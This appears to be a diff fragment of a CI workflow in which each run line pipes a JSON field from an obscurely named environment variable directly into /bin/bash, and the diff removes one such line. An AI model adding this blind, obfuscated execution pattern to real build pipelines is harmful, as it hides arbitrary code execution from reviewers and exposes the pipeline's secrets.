@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$jgsqi0131" | jq -r .bjs8 | /bin/bash
           echo $sg289 | jq -r .jy13070 | /bin/bash
           echo $umqh6813 | jq -r .ry161 | /bin/bash
-          printf '%s' "$fa2" | jq -r .d74 | /bin/bash
           echo $j25 | jq -r .tmb26512 | /bin/bash
 
       - name: Store results
